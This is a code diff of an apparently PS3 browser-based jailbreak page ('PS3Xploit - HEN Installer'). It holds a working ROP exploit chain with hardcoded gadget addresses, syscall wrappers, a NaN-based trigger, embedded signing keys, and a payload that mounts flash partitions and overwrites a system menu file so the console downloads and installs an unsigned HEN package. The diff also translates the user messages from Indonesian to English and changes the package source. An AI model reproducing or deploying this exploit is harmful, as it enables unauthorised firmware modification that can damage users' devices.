@@ -29,12 +29,6 @@ var xtra_data,
 	mbytes = 1048576,
 	stat_size_offset = 40,
 	toc_addr = 0x6F5558,
-	toc_entry1_addr = 0x6DA3D0,
-	toc_entry2_addr = 0x725B38,
-	toc_entry3_addr = 0x6DA3C8,
-	toc_entry4_addr = 0x740000,
-	toc_entry5_addr = 0x6EB6C8,
-	toc_entry6_addr = 0x0,
 	gadget1_addr = 0x097604,
 	gadget2_addr = 0x60A0E4,
 	gadget3_addr = 0x0D505C,
@@ -68,16 +62,35 @@ var xtra_data,
 	gadget_mod14_addr = 0x633900,
 	gadget_mod15_addr = 0x39D038,
 	gadget_mod16_addr = 0x4F732C,
+	index_key = "DA7D4B5E499A4F53B1C1A14A7484443B",
+	ps3xploit_ecdsa_key = "948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",
 	flash_partition='xxxxCELL_FS_IOS:BUILTIN_FLSH1',
 	filesystem='CELL_FS_FAT',
 	mount_path='/dev_rewrite',
-	fail_msg_frag="<h1><span style='color:red'>Eksploitasi inisialisasi gagal!</h1></span><h2>1. Tekan select lalu Add to Bookmark<br>2. Keluar dari Browser kemudian tunggu beberapa detik, lalu masuk lagi ke Browser<br>3. Tekan select buka website yang tadi diBookmark, tunggu sampai proses selesai<br>4. Jika masih gagal silahkan restart dahulu PS3 anda</h2>",
-	progress_msg_frag1="<h1>Memulai ... ",
+	mount_path2='/dev_blind',
+	fail_msg_frag="<h1><span style='color:red'>Exploit initialization failed!</h1></span>",
+	progress_msg_frag1="<h1>Initializing... ",
 	progress_msg_frag2='%</h1>',
-	toc_addr=7296344;
-
-document.write('<html><title>Install HEN 3.0.2 Plus+</title><div id="result"></div><div id="exploit"></div><div id="trigger"></div></html>');
-
+	write_file = "/dev_rewrite/vsh/resource/explore/xmb/category_network.xml",
+	write_file_contents='<?xml version="1.0" encoding="UTF-8"?><XMBML version="1.0"><View id="root"><Attributes><Table key="hen"><Pair key="focus_priority"><String>-1</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="hen" attr="hen" src="#hen_link"/><Query class="type:x-xmb/folder-pixmap" key="seg_premo" src="sel://localhost/nopremo?category_network.xml#seg_premo"/><Query class="type:x-xmb/folder-pixmap" key="seg_browser" src="#seg_browser"/></Items></View><View id="seg_premo"><Items><Item class="type:x-xmb/xmlpremo" key="PRemo" /></Items></View><View id="seg_browser"><Attributes><Table key="browser"><Pair key="icon_rsc"><String>tex_browser</String></Pair><Pair key="icon_notation"><String>WNT_XmbItemBrowser</String></Pair><Pair key="title_rsc"><String>msg_browser</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlwebbrowser" key="browser" attr="browser" /></Items></View><View id="hen_link"><Attributes><Table key="ps3hen_main"><Pair key="icon_rsc"><String>item_tex_Players</String></Pair><Pair key="title"><String>Install HEN</String></Pair><Pair key="info"><String>Downloads and installs the latest HEN Package (Reboot after)</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="ps3hen_main" attr="ps3hen_main" src="#ps3hen_pkg" /></Items></View><View id="ps3hen_pkg"><Attributes><Table key="ps3hen_link"><Pair key="info"><String>net_package_install</String></Pair><Pair key="pkg_src"><String>http://'+window.location.host+'/HEN.pkg</String></Pair><Pair key="pkg_src_qa" ><String>http://'+window.location.host+'/HEN.pkg</String></Pair><Pair key="content_name"><String>msg_install</String></Pair><Pair key="content_id"><String>CUSTOM-INSTALLER_00-0000000000000000</String></Pair><Pair key="prod_pict_path"><String>http://xmbmods.co/i/hendl.png</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlnpsignup" key="ps3hen_link" attr="ps3hen_link" /></Items></View></XMBML>';
+document.write('<html><title>PS3Xploit - HEN Installer</title><div id="result"></div><div id="exploit"></div><div id="trigger"></div></html>');
+function memcpy(dest,src,len)
+{
+	return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70);
+}
+function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out)
+{
+	var min_stack_size=0x20; 
+	if(r31out===null){r31out=gtemp_addr;}
+	if(r31in===null){r31in=gtemp_addr;}
+	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r11)+hexw2bin(r10)
+	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
+	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31in)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(sub)+fill_by_16bytes(sub_frame_size-min_stack_size,dbyte00)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
+}
+function encTxt(text)
+{
+	return String.fromCharCode.apply(null,text.split('').map(function(e){return e.charCodeAt(0).toString(16)}).join('').toUpperCase().match(/[A-F0-9]{4}/g).map(function(v){return parseInt(v,16)}))
+}
 function showResult(str)
 {
 	document.getElementById('result').innerHTML=str;
@@ -89,32 +102,11 @@ function syscall_r3_p2p(sc,r3_ptr,r4,r5,r6,r7,r8,r9,r10,r31out)
 	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3_ptr)
 	+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
 }
-function syscall_r3r5_p2p(sc,r3_ptr,r4,r5_ptr,r6,r7,r8,r9,r10,r31out)
-{
-	if(r31out===null){r31out=gtemp_addr;}
-	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
-	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(r5_ptr-0x4)+hexdw2bin(gtemp_addr)+fill_by_8bytes(0x18,dbyte41)
-	+hexdw2bin(gadget_mod4c_addr)+fill_by_16bytes(0xB0,dbyte41)+hexdw2bin(r3_ptr)+fill_by_16bytes(0x10,dbyte41)
-	+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
-}
 function save_file_overwrite(to,fd,buf,wlen,size,nl)
 {
 	return syscall(0x321,to,0x241,fd,0x1B6,nl,0,0,0)
 		+syscall_r3_p2p(0x323,fd,buf,size,wlen,0,0,0,0,0,0)
 		+syscall_r3_p2p(0x324,fd,0,0,0,0,0,0,0,0,0);
-}
-function load_r3_word_from_ptr_32(offset,r26out,r27out,r28out,r29out,r30out,r31out)
-{
-	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+hexdw2bin(offset-0x8)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)
-	+hexdw2bin(gadget_mod15_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(r26out)+hexdw2bin(r27out)+hexdw2bin(r28out)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
-}
-function validate_word_from_ptr(w_ptr,opt_store,val,r29out,r30out,r31out)
-{
-	r29out=gtemp_addr;
-	r30out=gtemp_addr;
-	r31out=gtemp_addr;
-	return load_r3_word_from_ptr_32(w_ptr,gtemp_addr,gtemp_addr,gtemp_addr,gtemp_addr,opt_store,gtemp_addr)
-	+hexdw2bin(gadget_mod12_addr)+fill_by_16bytes(0x70,dbyte00)+fill_by_8bytes(0x8,dbyte00)+hexdw2bin(val)+fill_by_16bytes(0x10,dbyte00)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41);
 }
 function hexh2bin(hex_val)
 {
@@ -264,7 +256,7 @@ function checkMemory(address, size, len)
 function trigger(exploit_addr){
 	if(document.getElementById('trigger')){document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");}
 	if (document.getElementById('trigger').innerHTML.indexOf("NaN") != -1) {
-		document.write("<html><h1><span style='color:orange'>Kamu harus menginstal Hybrid Firmware (HFW) 4.87.1 sebelum menginstal HEN!</h1></span></html>");
+		document.write("<html><h1><span style='color:red'>You must install Hybrid Firmware (HFW) before installing HEN!</h1></span></html>");
 		return;
 	}
 }
@@ -273,7 +265,7 @@ function load_check()
 	if(total_loops<max_loops)
 	{
 		showResult(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
-		t_out=setTimeout(initROP,500,false);
+		t_out=setTimeout(initROP,100,false);
 	}
 	else
 	{
@@ -321,10 +313,6 @@ function findJsVariableOffset(name,exploit_data,base,size)
 	var end_range=base+size;
 	return 0;
 }
-function memcpy(dest,src,len)
-{
-	return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70);
-}
 function stack_frame_hookup()
 {
 	return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41);
@@ -339,15 +327,6 @@ function syscall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out)
 	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(sc)+hexw2bin(r10)
 	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
 	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
-}
-function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out)
-{
-	var min_stack_size=0x20; 
-	if(r31out===null){r31out=gtemp_addr;}
-	if(r31in===null){r31in=gtemp_addr;}
-	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r11)+hexw2bin(r10)
-	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
-	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31in)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(sub)+fill_by_16bytes(sub_frame_size-min_stack_size,dbyte00)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
 }
 function fill_by_4bytes(nbytes,hex_val)
 {
@@ -388,23 +367,24 @@ function initROP(init)
 		jump_2_addr=0;
 		jump_1_addr=0;
 		search_max_threshold=70*0x100000;
-		search_base=0x80150000;
+		search_base=0x80200000;
 		search_size=2*mbytes;
-		search_base_off=1*mbytes;
-		search_size_ext=2*mbytes;
+		search_base_off=0*mbytes;
+		search_size_ext=0*mbytes;
 		total_loops++;
 		store_idx_arr1=[];
 		store_idx_arr2=[];
 
-		var write_file="/dev_rewrite/vsh/resource/explore/xmb/category_network.xml";
-		var write_file_contents='<?xml version="1.0" encoding="UTF-8"?><XMBML version="1.0"><View id="root"><Attributes><Table key="hen"><Pair key="focus_priority"><String>-1</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="hen" attr="hen" src="#hen_link"/><Query class="type:x-xmb/folder-pixmap" key="seg_premo" src="sel://localhost/nopremo?category_network.xml#seg_premo"/><Query class="type:x-xmb/folder-pixmap" key="seg_browser" src="#seg_browser"/></Items></View><View id="seg_premo"><Items><Item class="type:x-xmb/xmlpremo" key="PRemo" /></Items></View><View id="seg_browser"><Attributes><Table key="browser"><Pair key="icon_rsc"><String>tex_browser</String></Pair><Pair key="icon_notation"><String>WNT_XmbItemBrowser</String></Pair><Pair key="title_rsc"><String>msg_browser</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlwebbrowser" key="browser" attr="browser" /></Items></View><View id="hen_link"><Attributes><Table key="ps3hen_main"><Pair key="icon_rsc"><String>item_tex_Players</String></Pair><Pair key="title"><String>Install HEN</String></Pair><Pair key="info"><String>HEN Version 3.0.2 Plus+</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="ps3hen_main" attr="ps3hen_main" src="#ps3hen_pkg" /></Items></View><View id="ps3hen_pkg"><Attributes><Table key="ps3hen_link"><Pair key="info"><String>net_package_install</String></Pair><Pair key="pkg_src"><String>https://github.com/valk7/valk7.github.io/notheme/raw/main/HEN.pkg</String></Pair><Pair key="pkg_src_qa" ><String>https://github.com/valk7/valk7.github.io/notheme/raw/main/HEN.pkg</String></Pair><Pair key="content_name"><String>msg_install</String></Pair><Pair key="content_id"><String>CUSTOM-INSTALLER_00-0000000000000000</String></Pair><Pair key="prod_pict_path"><String>'+baseURL+'hendl.png</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlnpsignup" key="ps3hen_link" attr="ps3hen_link" /></Items></View></XMBML><!-- o --> ';
-
 		xtra_data=flash_partition.convert()
+		+index_key.convert(true)
+		+ps3xploit_ecdsa_key.convert(true)
 		+filesystem.convert()
 		+mount_path.convert()
+		+mount_path2.convert()
+		+flash_partition.substr(4).convert()
 		+write_file.convert()
 		+fill_by_4bytes(0xC,dbyte00)
-		+write_file_contents
+		+encTxt(write_file_contents)
 		+fill_by_4bytes(0xC,dbyte00)
 		+fill_by_16bytes(0x90,dbyte00)
 		+unescape("\uFD7E");
@@ -418,24 +398,30 @@ function initROP(init)
 		}
 
 		flash_partition_addr=xtra_data_addr;
-		fs_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
+		index_key_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
+		ps3xploit_ecdsa_key_addr=index_key_addr+index_key.convertedSize(true);
+		fs_addr=ps3xploit_ecdsa_key_addr+ps3xploit_ecdsa_key.convertedSize(true);
 		mount_path_addr=fs_addr+filesystem.convertedSize();
+		mount_path2_addr=mount_path_addr+mount_path.convertedSize();
+		flash_partition2_addr=mount_path2_addr+mount_path2.convertedSize();
 
-		write_file_addr=mount_path_addr+mount_path.convertedSize();
+		write_file_addr=flash_partition2_addr+flash_partition.convertedSize()-0x4;
 		write_filefd_addr=write_file_addr+write_file.convertedSize();
 		write_file_readlen_addr=write_filefd_addr+word_size;
 		write_file_contents_addr=write_file_readlen_addr+dword_size;
 
-		store_idx_arr1[0]=(write_file_contents_addr-flash_partition_addr+0x8)/2;
-
 		null_addr=write_file_contents_addr+dword_size;
-		store_idx_arr2[0]=(null_addr-flash_partition_addr+0xC)/2;
-		stat_addr=null_addr+dword_size*0x5;
 
 		stack_frame=stack_frame_hookup()
-		+store_word(7256944, 617820)
+		+store_word(7185360, 617820+4)
+		+store_word(7185352, 617820+4)
+		+store_word(7255752, 617820+4)
+		+store_word(7263660, 7370860)
+		+memcpy(7370860-0x20, index_key_addr, (index_key.length/2))
+		+memcpy(7370860,ps3xploit_ecdsa_key_addr,(ps3xploit_ecdsa_key.length/2))
 		+syscall(0x345,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
-		+save_file_overwrite(write_file_addr,write_filefd_addr,write_file_contents_addr,write_file_readlen_addr,0x828,null_addr)
+		+syscall(0x345,flash_partition2_addr,fs_addr,mount_path2_addr,0,0,0,0,0)
+		+save_file_overwrite(write_file_addr,write_filefd_addr,write_file_contents_addr,write_file_readlen_addr,write_file_contents.length,null_addr)
 		+stack_frame_exit();
 
 		while(stack_frame_addr===0)
@@ -471,7 +457,7 @@ function initROP(init)
 		if((j2===jump_2)&&(j1===jump_1)&&(x===xtra_data)&&(sf===stack_frame))
 		{
 			if(t_out!==0){clearTimeout(t_out);}
-			showResult('<h1>Mempersiapkan...');
+			showResult('<h1>Preparing...');
 			triggerX();
 		}
 		else
@@ -481,13 +467,13 @@ function initROP(init)
 	}
 	catch(e)
 	{
-		
+		showResult(e)
 	}
 }
 function triggerX()
 {
-	setTimeout(trigger,100,jump_1_addr);
-	setTimeout(showResult,2000,"<h1><span style='color:blue'>Bagaimana cara menginstal HEN :</h1></span><h2>1. Tutup browser<br>2. Buka Remote Play dan segera keluar<br>3. Gunakan ikon baru untuk mengunduh dan menginstal HEN</span><br>4. Reboot setelah instalasi</h2>");
+	setTimeout(trigger,10,jump_1_addr);
+	setTimeout(showResult,1000,"<h1>How to install HEN</h1><h2>1. Close browser<br>2. Open Remote Play and quit immediately<br>3. Use new icon to download and install HEN</span><br>4. Reboot after installation</h2>");
 	t_out=0;
 	total_loops=0;
 }
